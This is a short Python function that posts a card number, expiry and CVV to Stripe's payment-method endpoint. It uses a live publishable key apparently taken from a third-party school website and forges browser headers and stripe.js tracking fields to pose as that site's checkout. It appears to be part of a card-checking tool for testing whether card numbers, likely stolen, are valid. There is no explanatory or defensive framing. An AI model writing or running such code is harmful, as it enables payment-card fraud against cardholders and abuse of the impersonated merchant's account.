import requests
def extractpm(cnn, month, year, cvv):
   # print(cnn, month, year, cvv)
    url = "https://api.stripe.com/v1/payment_methods"
    
    payload = f"type=card&card[number]={cnn}&card[cvc]={cvv}&card[exp_month]={month}&card[exp_year]={year}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fe7a8c6762a%3B+stripe-js-v3%2Fe7a8c6762a%3B+card-element&referrer=https%3A%2F%2Frightschoolchoice.com&time_on_page=237409&key=pk_live_51LdVzMFskcjYJGi8SujGdXntqph9M3lB24AMlOfePTVk9ig0V6d3uqSmcFXRE7Ugo9UUP4A3YKMfRx5Hmt2kb6ql00omDP1o0a"
    
    headers = {
      'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
      'Accept': "application/json",
      'authority': "api.stripe.com",
      'accept-language': "en-US,en;q=0.9",
      'origin': "https://js.stripe.com",
      'referer': "https://js.stripe.com/",
      'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
      'sec-ch-ua-mobile': "?1",
      'sec-ch-ua-platform': "\"Android\"",
      'sec-fetch-dest': "empty",
      'sec-fetch-mode': "cors",
      'sec-fetch-site': "same-site"
    }
    
    response = requests.post(url, data=payload, headers=headers)
    
    try:
        pm = response.json()['id']
        #}print(response)
        return pm
    except (KeyError, ValueError, Exception):
        return None
        
